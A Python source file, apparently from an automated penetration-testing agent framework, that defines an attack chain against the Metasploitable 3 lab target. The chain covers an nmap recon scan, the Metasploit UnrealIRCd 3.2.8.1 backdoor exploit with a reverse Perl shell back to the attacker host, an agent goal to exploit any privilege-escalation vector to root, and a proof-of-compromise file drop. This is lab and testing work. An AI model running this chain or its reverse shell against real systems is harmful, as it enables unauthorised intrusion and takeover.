"""
Example Attack Graph: UnrealIRCd 3.2.8.1 Backdoor RCE (Metasploitable 3)

Unauthenticated service-level exploit chain against MS3's UnrealIRCd
on port 6667. The 3.2.8.1 tarball was trojaned with a backdoor command
that executes arbitrary shell input prefixed with "AB;", which Metasploit
weaponizes into a one-shot RCE / reverse shell.

Chain:
  recon          — nmap full scan
  irc_fingerprint— banner-grab 6667 to confirm UnrealIRCd
  irc_backdoor   — exploit/unix/irc/unreal_ircd_3281_backdoor -> shell
  escalate — id / sudo -l / find SUID enumeration on the new shell
  file_drop      — write proof-of-compromise file and read it back

Expected: clean run lands a command shell via the backdoor.
escalate reports whatever privesc surface the shell user has,
and file_drop writes /tmp/pwned_unrealircd.txt as the impact step.
"""

from core_agents.attack_graph import (
    AttackGraph, AttackNode, AttackEdge, EdgeCheck,
    EdgeCondition, Tactic,
)


def build_unrealircd_backdoor_graph(target_ip: str, attacker_ip: str) -> AttackGraph:

    graph = AttackGraph.create(
        objective="Compromise the Metasploitable 3 target via the UnrealIRCd "
                  "3.2.8.1 backdoor on port 6667. Land a command shell, "
                  "enumerate privileges from the shell, and drop a "
                  "proof-of-compromise file in /tmp.",
        target_ip=target_ip,
        name=f"unrealircd_backdoor_{target_ip}",
        attacker_ip=attacker_ip,
        scope=[target_ip],
        description="UnrealIRCd 3.2.8.1 backdoor unauth RCE baseline against MS3.",
        metadata={"scenario": "unrealircd_backdoor", "target_type": "metasploitable3"},
    )

    # =========================================================================
    # NODES
    # =========================================================================

    graph.add_node(AttackNode(
        id="recon",
        label="Nmap Full Scan",
        tactic=Tactic.RECONNAISSANCE.value,
        technique_id="T1046",
        technique_name="Network Service Discovery",
        agent_type="recon",
        goal="Map the target's attack surface and confirm IRC on 6667",
        objective=f"Full port scan with service versioning on {target_ip}.",
        target_ip=target_ip,
        tool_name="nmap",
        commands_to_run=[f"nmap -sV -p 0-65535 {target_ip}"],
        tags=["nmap", "full_scan"],
    ))

    graph.add_node(AttackNode(
        id="irc_fingerprint",
        label="UnrealIRCd Version Banner Grab",
        tactic=Tactic.DISCOVERY.value,
        technique_id="T1592.002",
        technique_name="Gather Victim Host Info: Software",
        agent_type="recon",
        goal="Confirm the IRC service on 6667 is UnrealIRCd 3.2.8.1",
        objective=f"Banner-grab {target_ip}:6667 to verify UnrealIRCd 3.2.8.1.",
        target_ip=target_ip,
        tool_name="ssh",
        commands_to_run=[
            f"nmap -sV -p6667 {target_ip}",
        ],
        max_retries=1,
        tags=["irc", "banner", "version_check"],
    ))

    graph.add_node(AttackNode(
        id="irc_backdoor",
        label="UnrealIRCd 3.2.8.1 Backdoor RCE",
        tactic=Tactic.INITIAL_ACCESS.value,
        technique_id="T1190",
        technique_name="Exploit Public-Facing Application",
        agent_type="exploit",
        goal="Obtain a command shell via the UnrealIRCd backdoor",
        objective=f"Run exploit/unix/irc/unreal_ircd_3281_backdoor against "
                  f"{target_ip}:6667; payload cmd/unix/reverse_perl.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="exploit/unix/irc/unreal_ircd_3281_backdoor",
        module_options={
            "RHOSTS": target_ip,
            "RPORT": 6667,
        },
        payload="cmd/unix/reverse_perl",
        payload_options={
            "LHOST": attacker_ip,
            "LPORT": 4451,
        },
        max_retries=3,
        tags=["unrealircd", "backdoor", "rce", "unauth"],
    ))

    graph.add_node(AttackNode(
        id="escalate",
        label="Escalate Privileges to Root",
        tactic=Tactic.PRIVILEGE_ESCALATION.value,
        technique_id="T1068",
        technique_name="Exploitation for Privilege Escalation",
        agent_type="privesc",
        goal="Escalate the compromised session to root",
        objective="From the existing session, enumerate AND exploit any viable "
                  "privilege-escalation vector (sudo, SUID, kernel exploit, cron, "
                  "capabilities, writable config, docker group) to obtain a root "
                  "shell. Verify success with id/whoami showing uid=0.",
        target_ip=target_ip,
        max_retries=1,  # interim: deterministic timeout failure is not worth retrying (see roadmap P1)
        tags=["privesc", "escalation", "goal_only"],
    ))

    graph.add_node(AttackNode(
        id="file_drop",
        label="Drop Proof-of-Compromise File",
        tactic=Tactic.IMPACT.value,
        technique_id="T1485",
        technique_name="Data Destruction",
        agent_type="impact",
        goal="Demonstrate compromise with a written artifact in /tmp",
        objective="Write a proof-of-compromise file via the backdoor session.",
        target_ip=target_ip,
        tool_name="session",
        commands_to_run=[
            "echo '{marker}' > {target_file}",
            "echo \"Compromised at $(date)\" >> {target_file}",
            "echo \"User: $(whoami)\" >> {target_file}",
            "cat {target_file}",
        ],
        command_params={
            "target_file": "/tmp/pwned_unrealircd.txt",
            "marker": "PWNED via UnrealIRCd backdoor",
        },
        command_params_alternatives={
            "target_file": ["/var/tmp/pwned_unrealircd.txt", "/dev/shm/pwned_unrealircd.txt"],
        },
        max_retries=3,
        metadata={"target_file": "/tmp/pwned_unrealircd.txt"},
        tags=["impact", "file_drop", "proof"],
    ))

    # =========================================================================
    # EDGES
    # =========================================================================

    graph.connect(
        "recon", "irc_fingerprint",
        checks=[
            EdgeCheck(
                field="ports", operator="any_port",
                expected={"port": 6667},
                description="IRC service is open on 6667",
            ),
        ],
        evidence="Nmap found IRC on port 6667",
        rationale="Confirm UnrealIRCd version before firing the exploit",
    )

    graph.connect(
        "irc_fingerprint", "irc_backdoor",
        checks=[
            EdgeCheck(
                field="success", operator="equals", expected="True",
                description="UnrealIRCd banner read",
            ),
        ],
        evidence="UnrealIRCd 3.2.8.1 confirmed in banner",
        rationale="Vulnerable version -- trigger the backdoor",
    )

    graph.connect(
        "irc_backdoor", "escalate",
        checks=[
            EdgeCheck(
                field="session_id", operator="exists",
                description="Command shell session opened",
            ),
        ],
        evidence="Got command shell via UnrealIRCd backdoor",
        rationale="Enumerate privesc paths from the new shell",
    )

    graph.connect(
        "escalate", "file_drop",
        checks=[
            EdgeCheck(
                field="success", operator="equals", expected="True",
                description="Session is usable",
            ),
        ],
        evidence="Session privileges enumerated",
        rationale="Drop the proof-of-compromise file as the impact step",
    )

    return graph


# =============================================================================
# CLI
# =============================================================================

if __name__ == "__main__":
    graph = build_unrealircd_backdoor_graph(
        target_ip="192.168.34.7",
        attacker_ip="192.168.34.6",
    )
    print(graph.summary())
    print()

    out_path = "examples/unrealircd_backdoor_graph.json"
    graph.save(out_path)
    print(f"Saved to {out_path}")

    loaded = AttackGraph.load(out_path)
    print(f"\nReloaded: {loaded}")
    print(f"Ready nodes: {loaded.ready_nodes()}")
